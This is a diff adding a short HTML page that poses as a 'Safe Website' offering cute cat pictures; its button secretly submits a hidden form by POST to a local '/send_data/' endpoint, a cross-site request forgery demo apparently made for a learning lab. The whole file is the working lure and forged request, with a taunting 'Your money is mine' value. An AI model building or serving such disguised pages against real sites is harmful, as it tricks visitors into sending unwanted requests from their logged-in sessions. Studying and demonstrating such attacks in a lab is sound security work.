@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Safe Website</title>
+</head>
+<body>
+    <h1>Click the button below to view cute cats</h1>
+
+    <button onclick='hack()'>Click me</button>
+
+    <form id="myform" action="http://127.0.0.1:8000/send_data/" method="POST">
+        <input type="hidden" name="data" value="Your money is mine, Gotcha !!">
+    </form>
+
+    <script>
+        function hack(){
+            form = document.getElementById('myform')
+            form.submit()
+        }
+    </script>
+</body>
+</html>
